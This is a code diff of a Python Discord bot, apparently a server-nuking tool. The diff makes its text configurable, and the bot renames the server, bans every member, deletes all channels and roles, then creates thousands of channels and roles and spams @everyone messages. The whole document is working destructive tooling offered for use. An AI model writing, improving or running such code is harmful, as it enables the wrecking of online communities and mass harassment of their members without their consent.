@@ -5,8 +5,14 @@ from asyncio import create_task
 
 intents = discord.Intents.all()
 intents.members = True
-client = commands.Bot(command_prefix='!', intents=intents)
-token = ""
+client = commands.Bot(command_prefix='YOUR PREFIX', intents=intents)
+token = "YOUR TOKEN"
+
+
+message = "YOUR TEXT"
+reason = "YOUR TEXT"
+channels_name = "YOUR TEXT"
+roles_name = "YOUR TEXT"
 
 
 @client.event
@@ -26,7 +32,7 @@ async def start(ctx):
     await ctx.message.delete()
 
     with open('image.png') as image:
-        await ctx.guild.edit(name="Your Text", icon=image.read())
+        await ctx.guild.edit(name=message, icon=image.read())
 
     create_task(ban_all(ctx))
     create_task(delete_channels(ctx))
@@ -36,7 +42,7 @@ async def start(ctx):
 async def delete_channels(ctx):
     for channels in ctx.guild.channels:
         try:
-            await channels.delete(reason="Your Text")
+            await channels.delete(reason=reason)
             print_bot(f"`{channels.name}` Has been deleted.")
         except:
             print_bot(f"Unable to delete this channel `{channels.name}`.")
@@ -48,7 +54,7 @@ async def delete_channels(ctx):
 async def delete_roles(ctx):
     for role in ctx.guild.roles:
         try:
-            await role.delete(reason="Your Text")
+            await role.delete(reason=reason)
             print_bot(f"`{role.name}` Has been deleted.")
         except:
             print_bot(f"This role `{role.name}` cannot be deleted.")
@@ -60,7 +66,7 @@ async def delete_roles(ctx):
 async def ban_all(ctx):
     for member in ctx.guild.members:
         try:
-            await member.ban(reason="Your Text")
+            await member.ban(reason=reason)
             print_bot(f"`{member.name}` Has been banned.")
         except:
             print_bot(f"Can't ban this `{member.name}` member.")
@@ -70,7 +76,7 @@ async def ban_all(ctx):
 async def create_channels(ctx):
     for channels in range(9999):
         try:
-            channel = await ctx.guild.create_text_channel('Your Text')
+            channel = await ctx.guild.create_text_channel(channels_name)
             create_task(spam_messages(channel))
             print_bot("Channel has been created.")
         except:
@@ -81,7 +87,7 @@ async def create_channels(ctx):
 async def create_roles(ctx):
     for roles in range(9999):
         try:
-            await ctx.guild.create_role(name="Your Text")
+            await ctx.guild.create_role(name=roles_name)
             print_bot("Role created.")
         except:
             print_bot("Can't create role.")
@@ -92,7 +98,7 @@ async def spam_messages(channel):
     allowed_mentions = discord.AllowedMentions(everyone=True)
     for messages in range(9999):
         try:
-            await channel.send("Your Text", allowed_mentions=allowed_mentions)
+            await channel.send(message, allowed_mentions=allowed_mentions)
             print_bot("Message sent.")
         except:
             print_bot("Unable to send message.")
